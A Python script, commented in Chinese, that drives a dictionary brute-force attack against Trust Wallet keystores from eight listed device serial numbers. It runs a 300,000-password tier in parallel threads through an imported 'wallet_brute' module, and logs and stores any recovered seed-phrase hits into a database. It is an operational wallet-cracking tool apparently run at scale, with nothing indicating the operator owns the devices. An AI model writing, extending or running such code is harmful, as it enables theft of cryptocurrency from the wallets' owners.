#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""T3 补跑驱动：对 8 台 Trust keystore 设备跑 T3（300k 字典），复用 wallet_brute 的测试过的函数。
用法: setsid nohup /usr/bin/python3 /tmp/wb_t3_supplement.py >> /www/wwwroot/i.131422.com/logs/wallet_brute_t3.log 2>&1 &
"""
import sys, os, time, json
BASE = '/www/wwwroot/i.131422.com'
os.chdir(BASE)
sys.path.insert(0, os.path.join(BASE, 'tools'))
import wallet_brute as wb
from concurrent.futures import ThreadPoolExecutor, as_completed

SERIALS = [
    'GF4T4VLQ05', 'F3PHK17K77', 'DX4QK0WJ0X', 'H9393QG9Y1',
    'XGV9PT27H2', 'K69VGQQ6FM', 'H4HNJLH49N', 'C7CDQA9H0GPQ',
]
TIER = 'T3'
LIMIT = wb.TIERS[TIER]
WORKERS = 8

prog = wb.load_json(wb.PROG, {}) or {}
lock = __import__('threading').Lock()

def job(sn):
    wb.log('  [T3补跑] 开始 %s（上限 %d 口令）' % (sn, LIMIT))
    try:
        r = wb.run_one(sn, TIER, LIMIT)
    except Exception as e:
        wb.log('  [T3补跑] %s 异常: %s' % (sn, e))
        return {'serial': sn, 'error': str(e)}
    with lock:
        p = prog.setdefault(sn, {})
        p[TIER] = {'done': True, 'ts': int(time.time()), 'secs': r['secs'],
                   'wallets': r['wallets'], 'mnems': r['mnems'], 'rc': r['rc'], 'supplement': True}
        if r['hit']:
            p['hit'] = True
            ok = wb.merge_hit(sn, r['out'])
            hits = wb.load_json(wb.HITS, []) or []
            hits.append({'serial': sn, 'kind': 'trust-supplement', 'tier': TIER, 'mnems': r['mnems'],
                         'ts': int(time.time()), 'merged': bool(ok)})
            wb.save_json(wb.HITS, hits)
            wb.log('★ [T3补跑] 命中 %s 助记词×%d 用时%d秒 → %s' % (sn, r['mnems'], r['secs'], '已回写并入库' if ok else '回写失败!'))
        else:
            wb.log('   [T3补跑] 未中 %s wallets=%d mnems=%d 用时%d秒 rc=%d' % (sn, r['wallets'], r['mnems'], r['secs'], r['rc']))
        wb.save_json(wb.PROG, prog)
    return r

def main():
    wb.log('=== T3 补跑启动：%d 台 Trust 设备，并行 %d，字典 %d，预计 ~21 小时/台 ===' % (len(SERIALS), WORKERS, LIMIT))
    t0 = time.time()
    done = 0
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = {ex.submit(job, sn): sn for sn in SERIALS}
        for f in as_completed(futs):
            done += 1
            wb.log('=== T3 补跑进度 %d/%d 完成（累计 %.1f 小时）===' % (done, len(SERIALS), (time.time()-t0)/3600))
    wb.log('=== T3 补跑全部结束（%.1f 小时）===' % ((time.time()-t0)/3600))

if __name__ == '__main__':
    main()
